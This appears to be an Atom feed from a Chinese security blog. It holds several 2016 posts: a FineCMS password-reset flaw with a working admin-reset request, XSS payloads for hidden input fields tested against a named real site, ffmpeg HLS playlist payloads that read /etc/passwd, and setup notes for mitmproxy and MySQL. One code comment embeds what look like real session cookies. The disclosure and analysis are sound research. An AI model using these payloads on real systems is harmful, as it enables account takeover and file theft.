<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title><![CDATA[xd_xd's blog]]></title>
  
  <link href="/atom.xml" rel="self"/>
  <link href="http://xdxd.love/"/>
  <updated>2016-03-03T14:38:18.000Z</updated>
  <id>http://xdxd.love/</id>
  
  <author>
    <name><![CDATA[xd_xd]]></name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title><![CDATA[finecms <= 2.3.0 任意用户密码修改]]></title>
    <link href="http://xdxd.love/2016/03/03/finecms-2-3-0-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9/"/>
    <id>http://xdxd.love/2016/03/03/finecms-2-3-0-任意用户密码修改/</id>
    <published>2016-03-03T14:32:33.000Z</published>
    <updated>2016-03-03T14:38:18.000Z</updated>
    <content type="html"><![CDATA[<p>影响版本14年4月18号更新的2.3.0及以前的版本。最新版不存在这个问题。<br>乌云爆过一个<a href="http://www.wooyun.org/bugs/wooyun-2014-060197" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2014-060197</a> 利用暴力破解验证码的方式来重置密码，这里讨论的方式相对于暴力破解来说成本更低。</p>
<p>直接看代码验证验证码的逻辑：逻辑分析下载注释中。</p>
<p>case 2:</p>
<pre><code>                        <span class="variable">$uid</span> = (int)<span class="variable">$this-</span>&gt;input-&gt;get(<span class="string">'uid'</span>);
                        <span class="variable">$code</span> = (int)<span class="variable">$this-</span>&gt;input-&gt;post(<span class="string">'code'</span>);
                        从post获取验证码。
                        <span class="variable">$data</span> = <span class="variable">$this-</span>&gt;db
                                                 -&gt;<span class="keyword">where</span>(<span class="string">'uid'</span>, <span class="variable">$uid</span>)
                                                 -&gt;<span class="keyword">where</span>(<span class="string">'randcode'</span>, <span class="variable">$code</span>)
                          根据验证码和UID从数据库中查询数据。
                                                 -&gt;select(<span class="string">'salt,uid,username,email'</span>)
                                                 -&gt;limit(<span class="number">1</span>)
                                                 -&gt;get(<span class="string">'member'</span>)
                                                 -&gt;row_array();
                        <span class="keyword">if</span> (!<span class="variable">$data</span>) {
                        如果查不到该验证码对应的数据，提示错误。
        <span class="variable">$this-</span>&gt;member_msg(lang(<span class="string">'m-000'</span>));
    }

                        <span class="variable">$password1</span> = <span class="variable">$this-</span>&gt;input-&gt;post(<span class="string">'password1'</span>);
                        <span class="variable">$password2</span> = <span class="variable">$this-</span>&gt;input-&gt;post(<span class="string">'password2'</span>);
                        <span class="keyword">if</span> (<span class="variable">$password1</span> != <span class="variable">$password2</span>) {
                                <span class="variable">$error</span> = lang(<span class="string">'m-019'</span>);
                        } elseif (!<span class="variable">$password1</span>) {
                                <span class="variable">$error</span> = lang(<span class="string">'m-018'</span>);
                        } <span class="keyword">else</span> {
                                // 修改密码
                                <span class="variable">$this-</span>&gt;db
                                         -&gt;where(<span class="string">'uid'</span>, <span class="variable">$data</span>[<span class="string">'uid'</span>])
                                         -&gt;update(<span class="string">'member'</span>, array(
                        成功修改密码之后，验证码randcode设置为<span class="number">0</span>！！！！！
                                                <span class="string">'randcode'</span> =&gt; <span class="number">0</span>,
                                                <span class="string">'password'</span> =&gt; md5(md5(<span class="variable">$password1</span>).<span class="variable">$data</span>[<span class="string">'salt'</span>].md5(<span class="variable">$password1</span>))
                                         ));
                                if (<span class="variable">$this-</span>&gt;get_cache(<span class="string">'MEMBER'</span>, <span class="string">'setting'</span>, <span class="string">'ucenter'</span>)) {
            uc_user_edit(<span class="variable">$data</span>[<span class="string">'username'</span>], <span class="string">''</span>, <span class="variable">$password1</span>, <span class="string">''</span>, <span class="number">1</span>);
        }
                                <span class="variable">$this-</span>&gt;member_msg(lang(<span class="string">'m-052'</span>), dr_url(<span class="string">'login/index'</span>), <span class="number">1</span>);
                        }
                        break;
        }
}
</code></pre><p>这里一个逻辑问题就是，修改密码之后，验证码设置为零。去数据库中看了一下，这个字段的默认值是0，而判断验证码之前没有对验证码是否是0进行判断。导致使用0作为验证码可以直接修改任意账号的密码。这种方式在黑盒的任意密码重置案例中并没有见到过。<br><img src="/images/finecms5.jpg" alt=""></p>
<p>利用方式，直接post url：</p>
<pre><code><span class="string">http:</span><span class="comment">//www.<span class="label">xxxxxxx.com/member/index.php?c=login&amp;m=find&amp;step=2&amp;uid=1</span></span>
</code></pre><p>这里uid=1为管理员。 post 数据为code=0&amp;password1=12345678&amp;password2=12345678<br>在互联网实例中测试。</p>
<p><img src="/images/finecms6.jpg" alt=""></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>影响版本14年4月18号更新的2.3.0及以前的版本。最新版不存在这个问题。<br>乌云爆过一个<a href="http://www.wooyun.org/bugs/wooyun-2014-060197" target="_blank" rel="external">ht]]>
    </summary>
    
      <category term="代码审计" scheme="http://xdxd.love/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[centos 6安装mitmproxy]]></title>
    <link href="http://xdxd.love/2016/02/26/centos-6%E5%AE%89%E8%A3%85mitmproxy/"/>
    <id>http://xdxd.love/2016/02/26/centos-6安装mitmproxy/</id>
    <published>2016-02-26T07:18:01.000Z</published>
    <updated>2016-03-02T07:07:45.000Z</updated>
    <content type="html"><![CDATA[<p><img src="/source/mitmproxy1.png" alt=""></p>
<p>mitmproxy是一款支持HTTP(S)的中间人代理工具。不同于Fiddler2，burpsuite等类似功能工具，mitmproxy可在终端下运行。mitmproxy使用Python开发，是辅助web开发&amp;测试，移动端调试，渗透测试的工具。</p>
<p>mitmproxy作为定制化工具开发比较方便。但是mitmproxy需要太多依赖了。在mac上使用编译好的执行程序还是比较方便，ubuntu按照官方说明也比较方便安装。</p>
<p>ubuntu上安装命令如下：</p>
<pre><code>$ sudo apt-<span class="built_in">get</span> install python-pip python-<span class="built_in">dev</span> libffi-<span class="built_in">dev</span> libssl-<span class="built_in">dev</span> libxml2-<span class="built_in">dev</span> libxslt1-<span class="built_in">dev</span>
$ sudo pip install mitmproxy
</code></pre><p>mitmproxy官方没有在centos上的安装说明。在centos6.7上安装失败多次，最后按照<a href="http://pacess.blogspot.com/2014/11/install-mitmproxy-on-centos.html" target="_blank" rel="external">在 CentOS 下安裝 mitmproxy</a>的说明，安装成功。</p>
<pre><code>試過幾次失敗後，最終都能成功安裝在 CentOS <span class="number">6</span>。問題是出在 Python <span class="number">2.6</span> 及 Python <span class="number">3.4</span>。原來「mitmproxy」在 Python <span class="number">2.7</span> 才能順利安裝。要是使用 CentOS <span class="number">7</span> 的話，隨機附送的就是 Python <span class="number">2.7</span>。安裝「mitmproxy」的步驟如下：
<span class="number">1.</span> 下載 Python 的 PIP 工具
    wget https:<span class="comment">//bootstrap.pypa.io/get-pip.py</span>
<span class="number">2.</span> 安裝 Python <span class="number">2.7</span> 的 PIP
    python get-pip.py
<span class="number">3.</span> 下載 Python 的 EZ Setup
    wget https:<span class="comment">//bitbucket.org/pypa/setuptools/raw/bootstrap/ez_setup.py</span>
<span class="number">4.</span> 安裝 Python <span class="number">2.7</span> 的 EZ Setup
    python ez_setup.py
<span class="number">5.</span> 安裝需要的封包
    yum -y install python-pyasn1 python-flask python-urwid readline-devel gdbm-devel bzip2-devel ncurses-devel sqlite-devel tk-devel gcc python-setuptools python-pip python27-pip newt-python python-devel python27-devel python-pyasn1 pyOpenSSL gcc libxml2-devel libxslt-devel libffi-devel openssl-devel
<span class="number">6.</span> 安裝 pyOpenSSL <span class="number">0.14</span>
    easy_install http:<span class="comment">//pypi.python.org/packages/source/p/pyOpenSSL/pyOpenSSL-0.12.tar.gz</span>
</code></pre><p>最后 pip install mitmporxy 就好。</p>
<p><img src="/images/mitmproxy1.JPG" alt=""></p>
]]></content>
    <summary type="html">
    <![CDATA[<p><img src="/source/mitmproxy1.png" alt=""></p>
<p>mitmproxy是一款支持HTTP(S)的中间人代理工具。不同于Fiddler2，burpsuite等类似功能工具，mitmproxy可在终端下运行。mitmproxy使用P]]>
    </summary>
    
      <category term="mitmproxy" scheme="http://xdxd.love/tags/mitmproxy/"/>
    
      <category term="折腾不止" scheme="http://xdxd.love/categories/%E6%8A%98%E8%85%BE%E4%B8%8D%E6%AD%A2/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[sqlalchemy保存字典对象报语法错误]]></title>
    <link href="http://xdxd.love/2016/01/28/sqlalchemy%E8%AE%B0%E5%BD%95%E6%89%A7%E8%A1%8Csql/"/>
    <id>http://xdxd.love/2016/01/28/sqlalchemy记录执行sql/</id>
    <published>2016-01-28T09:08:12.000Z</published>
    <updated>2016-01-29T02:34:13.000Z</updated>
    <content type="html"><![CDATA[<h1 id="问题分析">问题分析</h1><p>使用sqlalchemy的过程中,遇到写数据库的时候报语法错误，相关代码如下：</p>
<pre><code># 定义requests对象,存储HTTP请求的所有信息<span class="value">:
class <span class="function">Requests</span>(Base):
    # 表的名字:
    __tablename__ = <span class="string">'requests'</span>
    # 表的结构:
    id = <span class="function">Column</span>(<span class="function">Integer</span>(), primary_key=True)
    # scheme = <span class="function">Column</span>(<span class="function">String</span>(<span class="number">20</span>))
    method = <span class="function">Column</span>(<span class="function">String</span>(<span class="number">200</span>))
    url = <span class="function">Column</span>(<span class="function">String</span>(<span class="number">2000</span>))
    headers = <span class="function">Column</span>(<span class="function">Text</span>(<span class="number">20000</span>))
    # cookies = <span class="function">Column</span>(<span class="function">Text</span>(<span class="number">20000</span>))
    content = <span class="function">Column</span>(<span class="function">Text</span>(<span class="number">20000</span>))
    # query = <span class="function">Column</span>(<span class="function">Text</span>(<span class="number">20000</span>))
    timestamp_start = <span class="function">Column</span>(<span class="function">String</span>(<span class="number">2000</span>))
    urlencoded_form=<span class="function">Column</span>(<span class="function">Text</span>(<span class="number">20000</span>))
    multipart_form=<span class="function">Column</span>(<span class="function">Text</span>(<span class="number">20000</span>))
    sqlmap=<span class="function">Column</span>(<span class="function">String</span>(<span class="number">20</span>))
    xss=<span class="function">Column</span>(<span class="function">String</span>(<span class="number">20</span>))

# 将请求信息写入数据库
def <span class="function">save_request</span>(flow):
    newrequest = <span class="function">Requests</span>(
            # scheme=flow.request.scheme,
            method=flow.request.method,
            url=flow.request.url,
            headers=<span class="function">str</span>(flow.request.headers.__dict__),
            # headers={<span class="string">'fields'</span>: [[<span class="string">'Host'</span>, <span class="string">'zone.wooyun.org'</span>], [<span class="string">'Proxy-Connection'</span>, <span class="string">'keep-alive'</span>], [<span class="string">'Cache-Control'</span>, <span class="string">'max-age=0'</span>], [<span class="string">'Accept'</span>, <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'</span>], [<span class="string">'Upgrade-Insecure-Requests'</span>, <span class="string">'1'</span>], [<span class="string">'User-Agent'</span>, <span class="string">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.82 Safari/537.36'</span>], [<span class="string">'Referer'</span>, <span class="string">'http://zone.wooyun.org/content/24881'</span>], [<span class="string">'Accept-Encoding'</span>, <span class="string">'gzip, deflate, sdch'</span>], [<span class="string">'Accept-Language'</span>, <span class="string">'zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4,fr;q=0.2'</span>], [<span class="string">'Cookie'</span>, <span class="string">'__cfduid=dc40888efca4ab0ff91186dc39428d9451452910746; wy_uid=5216UsFxwcFbseAhJt2wKwW3D3TWpih1g71JAjeIlpCT; wy_pwd=8c96%2BGWnQmu1BRR1RePbtZrkAZ6bY8HvlPtgcggYQmaideN8%2F08EAzHsV1XKQ72ZwX7q%2BxN4FJgnfUHorw; wy_token=192c2fd47fa5d03123ced3320c7e580c; PHPSESSID=e0e6vqec509trlqu7tv1lfeu70; bdshare_firstime=1453095346906; login_type=d8d1the3gNwSvY8dSI2oIhzdLszQ8nsd2ne%2Fl6JY; __ads_session=xk9roUMxqgiiIx0CggA=; Hm_lvt_c12f88b5c1cd041a732dea597a5ec94c=1453453560; Hm_lpvt_c12f88b5c1cd041a732dea597a5ec94c=1453876852; Hm_lvt_3faf3a47435cc512f3b86dc12af100d0=1453682212; Hm_lpvt_3faf3a47435cc512f3b86dc12af100d0=1453882158'</span>], [<span class="string">'AlexaToolbar-ALX_NS_PH'</span>, <span class="string">'AlexaToolbar/alxg-3.3'</span>]]},
            # cookies=flow.request.cookies,
            content=flow.request.content,
            # query=flow.request.query,
            timestamp_start=flow.request.timestamp_start,
            # id=<span class="function">get_md5_value</span>(flow.request.url+flow.request.content+<span class="function">str</span>(flow.request.timestamp_start))
            urlencoded_form=flow.request.urlencoded_form,
            multipart_form=flow.request.multipart_form,
    )
    session = <span class="function">DBSession</span>()
    session.<span class="function">add</span>(newrequest)
    session.<span class="function">commit</span>()
    session.<span class="function">close</span>()</span>
</code></pre><p>当写入的数据类型为字典时，报语法错误。</p>
<pre><code><span class="name">ProgrammingError</span>: (<span class="name">_mysql_exceptions</span>.<span class="name">ProgrammingError</span>) (<span class="number">1064</span>, <span class="string">'You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near \'\'fields\': "((\'Host\',\'dongweiming.github.io\'),(\'Proxy-Connection\',\'keep-alive\'),(\' at line 1'</span>) [<span class="name">SQL</span>: <span class="atom">u</span><span class="string">'INSERT INTO requests (method, url, headers, content, timestamp_start, urlencoded_form, multipart_form, sqlmap, xss) VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s)'</span>] [<span class="atom">parameters</span>: (<span class="string">'GET'</span>, <span class="string">'http://dongweiming.github.io/blog/archives/how-to-use-celery/'</span>, {<span class="string">'fields'</span>: [[<span class="string">'Host'</span>, <span class="string">'dongweiming.github.io'</span>], [<span class="string">'Proxy-Connection'</span>, <span class="string">'keep-alive'</span>], [<span class="string">'Cache-Control'</span>, <span class="string">'max-age=0'</span>], [<span class="string">'Accept'</span>, <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'</span>], [<span class="string">'Upgrade-Insecure-Requests'</span>, <span class="string">'1'</span>], [<span class="string">'User-Agent'</span>, <span class="string">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.82 Safari/537.36'</span>], [<span class="string">'Referer'</span>, <span class="string">'https://www.google.com/'</span>], [<span class="string">'Accept-Encoding'</span>, <span class="string">'gzip, deflate, sdch'</span>], [<span class="string">'Accept-Language'</span>, <span class="string">'zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4,fr;q=0.2'</span>], [<span class="string">'Cookie'</span>, <span class="string">'__utma=221486477.1712369208.1453863719.1453863719.1453972410.2; __utmc=221486477; __utmz=221486477.1453972410.2.2.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided)'</span>], [<span class="string">'AlexaToolbar-ALX_NS_PH'</span>, <span class="string">'AlexaToolbar/alxg-3.3'</span>], [<span class="string">'If-Modified-Since'</span>, <span class="string">'Tue, 26 Jan 2016 10:36:35 GMT'</span>]]}, <span class="string">''</span>, <span class="number">1454034516.300893</span>, <span class="name">None</span>, <span class="name">None</span>, <span class="name">None</span>, <span class="name">None</span>)]
</code></pre><p>一开始看到语法错误，感觉有SQL注入啊。可是sqlalchemy应该是用预编译的方式，报错信息也显示了，确实是采用了预编译的方式。</p>
<pre><code>u'<span class="type">INSERT</span> <span class="type">INTO</span> requests (<span class="keyword">method</span>, url, headers, content, timestamp_start, urlencoded_form, multipart_form, sqlmap, xss) <span class="type">VALUES</span> (%s, %s, %s, %s, %s, %s, %s, %s, %s)
</code></pre><p>使用如下python代码可以记录sqlalchemy执行的sql语句。</p>
<pre><code># <span class="tag">logging</span><span class="class">.basicConfig</span>(filename=<span class="string">'db.log'</span>)
# <span class="tag">logging</span><span class="class">.getLogger</span>(<span class="string">'sqlalchemy.engine'</span>)<span class="class">.setLevel</span>(logging.INFO)
</code></pre><p>经过调试分析发现，如果传入类型为字典，就会导致</p>
<pre><code>ProgrammingError: (_mysql_exceptions.ProgrammingError) (1064, 'You have <span class="keyword">an</span> <span class="keyword">error</span> <span class="keyword">in</span> your SQL <span class="keyword">syntax</span>; 
</code></pre><p>错误。</p>
<p>sqlalchemy的bug？是否有可能造成sql注入？</p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="问题分析">问题分析</h1><p>使用sqlalchemy的过程中,遇到写数据库的时候报语法错误，相关代码如下：</p>
<pre><code># 定义requests对象,存储HTTP请求的所有信息<span class="value">:
class <sp]]>
    </summary>
    
      <category term="python" scheme="http://xdxd.love/tags/python/"/>
    
      <category term="代码审计" scheme="http://xdxd.love/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[input标签type为hidden时的xss利用]]></title>
    <link href="http://xdxd.love/2016/01/20/input%E6%A0%87%E7%AD%BEtype%E4%B8%BAhidden%E6%97%B6%E7%9A%84xss%E5%88%A9%E7%94%A8/"/>
    <id>http://xdxd.love/2016/01/20/input标签type为hidden时的xss利用/</id>
    <published>2016-01-20T06:05:01.000Z</published>
    <updated>2016-01-20T06:45:54.000Z</updated>
    <content type="html"><![CDATA[<h1 id="问题场景">问题场景</h1><p>有时候会遇到这个场景的XSS，输出在input标签的value里，可以引入双引号，所以可以引入新的属性。但是type是hidden。导致常规的一些事件没法利用。</p>
<pre><code>&lt;input <span class="class"><span class="keyword">type</span></span>=<span class="string">"hidden"</span> name=<span class="string">"redacted"</span> value=<span class="string">"default"</span> injection=<span class="string">"xss"</span> /&gt;
</code></pre><h1 id="结论">结论</h1><p>在某些条件下是可以执行javascript的，但是比较鸡肋。资料收集的结论就是利用价值极低。</p>
<h1 id="利用方式">利用方式</h1><p>1，如果输出是在type=”hidden”之前，直接覆盖type，就变成了一个常规的xss。这个情况比较少见。</p>
<p>2，建立两个HTML文件，one.htm</p>
<pre><code><span class="tag">&lt;<span class="title">iframe</span> <span class="attribute">src</span>=<span class="value">two.htm</span>&gt;</span>
</code></pre><p>two.htm</p>
<pre><code>&lt;<span class="tag">input</span> type=hidden style=x:<span class="function"><span class="title">expression</span><span class="params">(alert(<span class="number">1</span>)</span></span>)&gt;
</code></pre><p>测试于IE6-9 可以弹。</p>
<p>3，firefox使用键盘交互的方式。</p>
<pre><code>&lt;input <span class="class"><span class="keyword">type</span></span>=<span class="string">"hidden"</span> accesskey=<span class="string">"X"</span> onclick=<span class="string">"alert(1)"</span>&gt;
</code></pre><p> Only works on Firefox. ALT+SHIFT+X on Windows/Linux, CTRL+ALT+X osx.</p>
<p>4,使用expression</p>
<p>IE6下</p>
<pre><code>&lt;<span class="tag">input</span> type=hidden style=x:<span class="function"><span class="title">expression</span><span class="params">(alert(<span class="number">1</span>)</span></span>)&gt;
</code></pre><h1 id="实例测试">实例测试</h1><pre><code><span class="keyword">http</span>://m.yohobuy.com/passport//back//backcode?phoneNum=15381187741&amp;token=a<span class="number">%20</span>accesskey=X<span class="number">%20</span>onclick=alert<span class="number">%281</span><span class="number">%29</span>&amp;areaCode=8
</code></pre><p><img src="/images/inputhidden1.png" alt=""></p>
<pre><code>http:<span class="regexp">//m</span>.yohobuy.com/passport//back//backcode?phoneNum=<span class="number">15381187741</span>&amp;token=e6fd9<span class="variable">%20style</span><span class="variable">%3dx</span><span class="variable">%3aexpr</span><span class="variable">%2f</span>**<span class="variable">%2fession</span>(<span class="keyword">open</span>(alert(<span class="number">1</span>)))<span class="variable">%20e6fd9</span>&amp;areaCode=<span class="number">8</span>
</code></pre><p><img src="/images/inputhidden2.png" alt=""></p>
<h1 id="参考资料">参考资料</h1><p><a href="http://zone.wooyun.org/content/9856" target="_blank" rel="external">http://zone.wooyun.org/content/9856</a><br><a href="http://blog.portswigger.net/2015/11/xss-in-hidden-input-fields.html" target="_blank" rel="external">http://blog.portswigger.net/2015/11/xss-in-hidden-input-fields.html</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="问题场景">问题场景</h1><p>有时候会遇到这个场景的XSS，输出在input标签的value里，可以引入双引号，所以可以引入新的属性。但是type是hidden。导致常规的一些事件没法利用。</p>
<pre><code>&lt;input <span cl]]>
    </summary>
    
      <category term="xss" scheme="http://xdxd.love/tags/xss/"/>
    
      <category term="前端安全" scheme="http://xdxd.love/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[ffmpeg SSRF漏洞分析]]></title>
    <link href="http://xdxd.love/2016/01/18/ffmpeg-SSRF%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://xdxd.love/2016/01/18/ffmpeg-SSRF漏洞分析/</id>
    <published>2016-01-18T10:41:41.000Z</published>
    <updated>2016-01-19T08:35:57.000Z</updated>
    <content type="html"><![CDATA[<h1 id="漏洞预警">漏洞预警</h1><p>这个漏洞关注度不高，最先被人知道应该是俄罗斯人写的<a href="http://habrahabr.ru/company/mailru/blog/274855/" target="_blank" rel="external">这个文章</a>，但是俄语看不懂，google翻译也没看懂。中文的相关报道都是来自<a href="http://www.solidot.org/story?sid=46891" target="_blank" rel="external">solidot</a>15日的这个简短报道。<br><img src="/images/ffmpegssrf1.png" alt=""></p>
<p>而ffmpeg得反应很快，1月16日就发布了修复版本。</p>
<p><img src="/images/ffmpegssrf2.png" alt=""></p>
<h1 id="漏洞影响">漏洞影响</h1><p>如果ffmpeg解析了一个恶意的文件，会导致本地的文件信息泄露。受影响的出了ctf中这个在线视频格式转换的服务外，如果是采用ffmpeg了客户端如果可以输入恶意文件也会造成本地文件信息泄露。</p>
<h1 id="漏洞分析">漏洞分析</h1><p>change log中提到了两个CVE CVE-2016-1897和CVE-2016-1898。</p>
<h2 id="CVE-2016-1897">CVE-2016-1897</h2><p>FFmpeg 2.x版本允许攻击者通过服务器端请求伪造(SSRF：Server-Side Request Forgery) 恶意远程窃取服务器端本地文件，由于ffmpeg的hls没有进行对file域协议进行有效限制，导致攻击者可通过构造hls切片索引文件以及ffmpeg对concat的支持(<a href="https://www.ffmpeg.org/ffmpeg-protocols.html#concat" target="_blank" rel="external">https://www.ffmpeg.org/ffmpeg-protocols.html#concat</a> )来恶意远程窃取服务器端本地文件/etc/passwd，所构造的恶意视频文件如下所示：</p>
<pre><code><span class="preprocessor">#EXTM3U</span>
<span class="preprocessor">#EXT-X-MEDIA-SEQUENCE:0</span>
<span class="preprocessor">#EXTINF:10.0,</span>
concat:http:<span class="comment">//dx.su/header.m3u8|file:///etc/passwd</span>
<span class="preprocessor">#EXT-X-ENDLIST</span>
</code></pre><h2 id="CVE-2016-1898">CVE-2016-1898</h2><p>FFmpeg 2.x版本允许攻击者通过服务器端请求伪造(SSRF：Server-Side Request Forgery) 恶意远程窃取服务器端本地文件，由于ffmpeg的hls没有进行对file域协议进行有效限制，导致攻击者可通过构造hls切片索引文件以及ffmpeg对subfile的支持(<a href="https://www.ffmpeg.org/ffmpeg-protocols.html#subfile" target="_blank" rel="external">https://www.ffmpeg.org/ffmpeg-protocols.html#subfile</a>  )来恶意远程窃取服务器端本地文件/etc/passwd，所构造的恶意视频文件如下所示：</p>
<pre><code><span class="comment">#EXTM3U</span>
<span class="comment">#EXT-X-MEDIA-SEQUENCE:0</span>
<span class="comment">#EXTINF:10.0,</span>
<span class="symbol">concat:</span><span class="symbol">http:</span>/<span class="regexp">/localhost/header</span>.m3u8|subfile,,start,<span class="number">0</span>,<span class="keyword">end</span>,<span class="number">64</span>,,<span class="symbol">:///etc/passwdconcat</span><span class="symbol">:http</span><span class="symbol">://localhost/header</span>.m3u8|subfile,,start,<span class="number">64</span>,<span class="keyword">end</span>,<span class="number">128</span>,,<span class="symbol">:///etc/passwdconcat</span><span class="symbol">:http</span><span class="symbol">://localhost/header</span>.m3u8|subfile,,start,<span class="number">128</span>,<span class="keyword">end</span>,<span class="number">256</span>,,<span class="symbol">:///etc/passwdconcat</span><span class="symbol">:http</span><span class="symbol">://localhost/header</span>.m3u8|subfile,,start,<span class="number">256</span>,<span class="keyword">end</span>,<span class="number">512</span>,,<span class="symbol">:///etc/passwd</span>
<span class="comment">#EXT-X-ENDLIST</span>
</code></pre><h1 id="CTF">CTF</h1><p>比较有意思的是查资料的过程中发现了这篇文章<a href="https://github.com/ctfs/write-ups-2015/tree/master/9447-ctf-2015/web/super-turbo-atomic-gif-converter" target="_blank" rel="external">9447 CTF 2015: Super Turbo Atomic GIF Converter</a></p>
<p>可以看到以下几个方式可以读取文件:</p>
<pre><code><span class="id">#EXTM3U</span>
<span class="id">#EXT-X-TARGETDURATION</span>:<span class="number">1</span>
<span class="id">#EXTINF</span>:<span class="number">1</span>,
/home/ctf/flag<span class="class">.txt</span>
<span class="id">#EXT-X-ENDLIST</span>

<span class="id">#EXTM3U</span>
<span class="id">#EXT-X-PLAYLIST-TYPE</span>:VOD
<span class="id">#EXT-X-TARGETDURATION</span>:<span class="number">1</span>
<span class="id">#EXT-X-VERSION</span>:<span class="number">3</span>
<span class="id">#EXT-X-MEDIA-SEQUENCE</span>:<span class="number">0</span>
<span class="id">#EXTINF</span>:<span class="number">10.0</span>,
file:<span class="comment">///home/ctf/flag.txt</span>
#EXT-X-ENDLIST
</code></pre><p>以及这里cve的concat方式。利用0day做ctf也是高端。</p>
<h1 id="参考资料">参考资料</h1><p><a href="http://habrahabr.ru/company/mailru/blog/274855/" target="_blank" rel="external">通过 ffmpeg 的播放列表实现 SSRF 以及窃取文件</a><br><a href="http://seclists.org/oss-sec/2016/q1/85" target="_blank" rel="external">http://seclists.org/oss-sec/2016/q1/85</a><br><a href="http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2016-1897" target="_blank" rel="external">http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2016-1897</a><br><a href="https://www.ffmpeg.org/ffmpeg-protocols.html#concat" target="_blank" rel="external">https://www.ffmpeg.org/ffmpeg-protocols.html#concat</a><br><a href="https://www.ffmpeg.org/ffmpeg-protocols.html#subfile" target="_blank" rel="external">https://www.ffmpeg.org/ffmpeg-protocols.html#subfile</a><br><a href="https://github.com/ctfs/write-ups-2015/tree/master/9447-ctf-2015/web/super-turbo-atomic-gif-converter" target="_blank" rel="external">https://github.com/ctfs/write-ups-2015/tree/master/9447-ctf-2015/web/super-turbo-atomic-gif-converter</a><br><a href="http://www.kernelpicnic.net/2015/11/29/9447CTF-Super-Turbo-Atomic-GIF-Converter-Write-Up.html" target="_blank" rel="external">http://www.kernelpicnic.net/2015/11/29/9447CTF-Super-Turbo-Atomic-GIF-Converter-Write-Up.html</a><br><a href="https://github.com/pwning/public-writeup/tree/master/9447ctf2015/web180-gif-converter" target="_blank" rel="external">https://github.com/pwning/public-writeup/tree/master/9447ctf2015/web180-gif-converter</a><br><a href="http://pastebin.com/FrsQinQz" target="_blank" rel="external">http://pastebin.com/FrsQinQz</a><br><a href="https://gist.github.com/Invizory/e45e1ee54cf0687f2002" target="_blank" rel="external">https://gist.github.com/Invizory/e45e1ee54cf0687f2002</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="漏洞预警">漏洞预警</h1><p>这个漏洞关注度不高，最先被人知道应该是俄罗斯人写的<a href="http://habrahabr.ru/company/mailru/blog/274855/" target="_blank" rel="external">]]>
    </summary>
    
      <category term="ffmpeg" scheme="http://xdxd.love/tags/ffmpeg/"/>
    
      <category term="漏洞挖掘" scheme="http://xdxd.love/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[mysql表名大小写敏感问题]]></title>
    <link href="http://xdxd.love/2016/01/18/mysql%E8%A1%A8%E5%90%8D%E5%A4%A7%E5%B0%8F%E5%86%99%E6%95%8F%E6%84%9F%E9%97%AE%E9%A2%98/"/>
    <id>http://xdxd.love/2016/01/18/mysql表名大小写敏感问题/</id>
    <published>2016-01-18T08:38:54.000Z</published>
    <updated>2016-01-18T08:52:47.000Z</updated>
    <content type="html"><![CDATA[<p>测试一个程序，提示找不到表。数据库看了一下表都存在的啊。貌似就大小写不对。抓执行的sql语句看了一下：</p>
<p><img src="/images/mysqltable1.png" alt=""><br>发现同一个表既有使用大写也有使用小写，也是醉了。google: mysql table name case sensitive就可以找到解决方案。参考mysql的文档:<a href="http://dev.mysql.com/doc/refman/5.7/en/identifier-case-sensitivity.html" target="_blank" rel="external">9.2.2 Identifier Case Sensitivity</a></p>
<p>windows上默认不区分大小写，但是linux上默认区分大小写。可以通过lower_case_table_names参数调整。设置lower_case_table_names=1可以不区分大小写。</p>
<p><img src="/images/mysqltable2.png" alt=""></p>
<p>我这里使用了官方的mysql docker镜像来做测试环境，只要添加一个启动参数就可以了。</p>
<pre><code>docker <span class="keyword">run</span> -<span class="keyword">d</span> -p 3306:3306 --name=appmysql5 -<span class="keyword">e</span> MYSQL_PASS=<span class="string">"root"</span> -<span class="keyword">e</span> MYSQL_USER=<span class="string">"root"</span>  -<span class="keyword">e</span> EXTRA_OPTS=<span class="string">"--log-raw"</span> -<span class="keyword">e</span> EXTRA_OPTS=<span class="string">"--lower_case_table_names=1"</span>  xd/mysql5.6:v1
</code></pre>]]></content>
    <summary type="html">
    <![CDATA[<p>测试一个程序，提示找不到表。数据库看了一下表都存在的啊。貌似就大小写不对。抓执行的sql语句看了一下：</p>
<p><img src="/images/mysqltable1.png" alt=""><br>发现同一个表既有使用大写也有使用小写，也是醉了。google: ]]>
    </summary>
    
      <category term="mysql" scheme="http://xdxd.love/tags/mysql/"/>
    
      <category term="奇技淫巧" scheme="http://xdxd.love/categories/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/"/>
    
